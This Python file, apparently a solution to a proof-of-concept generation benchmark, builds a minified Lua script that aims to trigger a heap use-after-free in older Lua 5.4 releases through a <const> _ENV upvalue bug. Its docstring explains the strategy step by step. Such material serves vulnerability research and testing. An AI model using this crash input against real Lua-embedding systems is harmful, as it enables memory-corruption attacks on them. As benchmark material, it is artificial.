import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a Heap Use After Free vulnerability in Lua.

        The vulnerability (present in Lua 5.4.x before 5.4.4) is related to incorrect
        bytecode generation for upvalues corresponding to a <const> _ENV variable.
        When a function with a large number of local variables declares a <const> _ENV
        and contains a closure that captures this _ENV, the compiler can generate
        faulty code. This can lead to the upvalue being prematurely garbage collected.
        A subsequent use of the closure results in accessing freed memory.

        The PoC is a minified Lua script that implements the following strategy:
        1.  Define a factory function `f()` that declares a large number of local
            variables (149 in this case). This is a "magic number" known to be
            effective in forcing variables onto the stack, triggering the bug.
        2.  Inside `f()`, declare `local _ENV <const> = {}`. This creates a new,
            constant environment for any closures defined within this scope.
        3.  Define an inner function `g()` that performs an assignment to a global
            variable (`a=1`). This operation implicitly accesses `_ENV` and thus
            creates a closure with an upvalue for `_ENV`.
        4.  The factory function `f()` returns the closure `g()`.
        5.  The main part of the script calls `f()` in a loop (200 times). This
            creates and discards many closures, churning memory and priming the
            garbage collector.
        6.  `collectgarbage()` is called to force a GC cycle. Due to the compiler
            bug, this can reclaim the memory for the closed `_ENV` upvalue.
        7.  Finally, `f()()` is executed. This creates a new closure `g` and
            immediately calls it. The call to `g` attempts to access its `_ENV`
            upvalue to perform the assignment `a=1`. Since the memory for the
            upvalue may have been freed, this results in a use-after-free,
            crashing the interpreter.

        The script is minified by removing whitespace and using concise syntax to
        achieve a smaller PoC size for a higher score.
        """
        num_vars = 149
        loop_count = 200

        # Generate a comma-separated list of variable names, e.g., "a1,a2,...,a149"
        var_list = ",".join([f"a{i}" for i in range(1, num_vars + 1)])

        # Construct the minified Lua PoC script. Semicolons are used to combine
        # statements, reducing the overall size.
        poc_script = (
            f"function f()local {var_list};"
            f"local _ENV<const>={{}};"
            f"local function g()a=1 end;"
            f"return g end;"
            f"for i=1,{loop_count} do f()end;"
            f"collectgarbage();"
            f"f()()"
        )

        return poc_script.encode('utf-8')